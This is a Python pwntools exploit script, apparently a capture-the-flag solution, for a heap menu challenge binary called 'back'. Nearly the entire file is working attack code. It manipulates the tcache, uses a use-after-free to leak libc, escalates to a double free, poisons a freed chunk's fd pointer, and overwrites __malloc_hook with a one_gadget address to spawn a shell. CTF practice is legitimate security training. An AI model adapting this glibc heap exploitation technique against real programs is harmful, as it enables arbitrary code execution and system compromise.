from pwn import *
io=process("./back",env={"LD_PRELOAD":"./libc.so.6"})

sla = lambda st,a : io.sendlineafter(st,str(a))
sl = lambda a : io.sendline(str(a))
ru = lambda st : io.recvuntil(st)
r = lambda s : io.recv(str(s))
sa = lambda st,a : io.sendafter(st,str(a))

def add_house(name,size,desc):
    sla("Choice >> ",1)
    sla("Name for your House : ",name)
    sla("Enter the size for description of House : ",size)
    sla("Enter the description : ",desc)

def add_person(name,size,deta):
    sla("Choice >> ",2)
    sla("Enter the name of the Person : ",name)
    sla("Enter the size for details of Person : ",size)
    sla("Enter the details : ",deta)

def move_person_to_house(person,house):
    sla("Choice >> ",3)
    sla("Enter the Person number : ",person)
    sla("Which House (0 or 1) ? : ",house)

def remove_person_from_house(house,person):
    sla("Choice >> ",4)
    sla("Which House (0 or 1) ? : ",house)
    sla("Enter the Person number : ",person)

def view_house(house):
    sla("Choice >> ",5)
    sla("Which House (0 or 1) ? : ",house)

def view_person(house,person):
    sla("Choice >> ",6)
    sla("Which House (0 or 1) ? : ",house)
    sla("Enter the Person number : ",person)

def party(house):
    sla("Choice >> ",7)
    sla("Which House (0 or 1) ? : ",house)


add_house("house1",20,"aaaaaaaa")
add_house("house2",20,"aaaaaaaa")

for i in range(10):
    add_person("sourag",96,"ddfgdg")

add_person("sourag",0x500,"ddfgdg")
add_person("sourag",0x500,"ddfgdg")
add_person("sourag",96,"ddfgdg")
add_person("sourag",96,"ddfgdg")
for i in range(5):
    move_person_to_house(i,0)        # adding five people to house1

for i in range(5):
    move_person_to_house(i+5,1)         # adding five people to house2

move_person_to_house(10,0)
move_person_to_house(11,1)
for i in range(5):
    remove_person_from_house(0,i)               # filling the tcache

for i in range(2):
    remove_person_from_house(1,i)              # filling the tcache

view_person(0,5)
remove_person_from_house(1,5)                  # triggering the bug to get a uaf

view_house(0)

io.recvuntil("Person 5   with details  ")
libc_leak = u64(io.recv(6)+"\x00\x00")-0x1e4ca0
log.info("libc @ "+str(hex(libc_leak)))

move_person_to_house(12,0)                 # 2 more persons to trigger the uaf second time
move_person_to_house(13,1)

view_person(1,0)
remove_person_from_house(0,0)        # triggering uaf to get double free
remove_person_from_house(1,2)       # chunk to prevent correption detection
party(1)

view_house(1)
for i in range(7):
    add_person("sourag",96,"ddfgdg")          # exhausting the tcache

hook=libc_leak+0x1e4c25
add_person("sourag",96,"ddfgdg")
add_person("sourag",96,"ddfgdg")
add_person(p64(hook+0x100),96,p64(hook))   # overwriting the fd
add_person("sourag",96,"ddfgdg")
add_person("sourag",96,"ddfgdg")
pay="A"*11+p64(libc_leak+0x106ef8)         # one_gadget
add_person("aaaaaaaaaaaaaaaaa",96,pay)     # overwriting malloc_hook
gdb.attach(io)

io.interactive()
